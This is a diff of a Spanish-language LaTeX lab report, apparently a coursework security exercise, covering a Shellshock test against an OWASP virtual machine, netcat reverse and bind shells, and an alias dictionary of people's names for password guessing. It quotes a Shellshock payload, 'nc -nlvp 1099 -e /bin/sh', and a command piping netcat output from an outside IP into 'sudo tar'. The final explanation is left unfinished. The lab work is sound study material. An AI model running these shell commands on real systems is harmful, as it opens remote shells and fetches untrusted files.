@@ -18,8 +18,8 @@
 
 \begin{enumerate}
 
-\item La direcci\'on IP de la m\'aquina virtual Kali es 192.168.1.155 (Bridged).
-\item La direcci\'on IP de la m\'aquina virtual OWASP es 192.168.1.133 (Bridged).\\
+\item La direcci\'on IP de la m\'aquina virtual Kali en este caso es 192.168.1.155 (Bridged).
+\item La direcci\'on IP de la m\'aquina virtual OWASP en este caso es 192.168.1.133 (Bridged).\\
 Tras ejecutar \textbf{env x='() \{ :;\}; echo vulnerable' bash -c "echo test"} vemos que es vulnerable a Shellshock.
 \item Luego de ejecutar todas las instrucciones mostradas, se procede a modificar el c\'odigo para poder asi, con ayuda de netcat, conseguir una reverse shell.
 \begin{center}
@@ -45,9 +45,9 @@ Como mitigar la vulnerabilidad? & Se podria considerar la posibilidad de instala
 \end{center}
 \end{table}
 
-\item El diccionario con los aliases se llama ekoparty.txt. Adem\'as, se agregan los nombres completos de las personas.
+\item El diccionario con los aliases se llama ekoparty.txt. Adem\'as, se agregan los nombres completos de las personas en un archivo aparte.
 
-\item Para analizar el comando \textbf{nc 143.0.100.198 1099 $|$ sudo tar -xf -} comenzaremos con la parte de netcat, es decir, nc. Esto se usa generalmente para crear una bind shell, donde el atacante se conecta a la victima con IP 143.0.100.198 al puerto 1099. En la victima se deberia ejecutar \textit{nc -nlvp 1099 -e /bin/sh}. Luego, la salida de este comando se redirecciona al comando tar, el cual con los parametos xf extrae un archivo -. 
+\item Para analizar el comando \textbf{nc 143.0.100.198 1099 $|$ sudo tar -xf -} comenzaremos con la parte de netcat, es decir, nc. Esto se usa generalmente para crear una bind shell, donde el atacante se conecta a la victima con IP 143.0.100.198 al puerto 1099. En la victima se deberia ejecutar \textit{nc -nlvp 1099 -e /bin/sh}. Luego, la salida de este comando se redirecciona al comando tar, el cual con los parametos xf extrae un archivo ???? 
 
 
 \end{enumerate}
